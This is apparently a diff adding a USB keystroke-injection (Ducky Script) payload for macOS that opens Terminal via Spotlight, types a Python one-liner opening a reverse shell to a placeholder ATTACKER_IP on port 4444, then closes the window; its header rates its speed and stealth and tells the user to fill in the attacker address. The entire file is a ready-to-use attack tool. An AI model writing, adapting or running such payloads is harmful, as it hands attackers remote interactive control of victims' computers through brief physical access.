@@ -1,0 +1,19 @@
+REM ============================================
+REM  FU PERSON | macOS Reverse Shell
+REM  FLLC - by PERSON FU
+REM  Time: ~5 seconds | Stealth: MEDIUM
+REM  Python reverse shell for macOS targets
+REM  Change ATTACKER_IP and PORT before use
+REM ============================================
+DELAY 500
+GUI SPACE
+DELAY 600
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 800
+STRING python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' &
+ENTER
+DELAY 300
+STRING exit
+ENTER
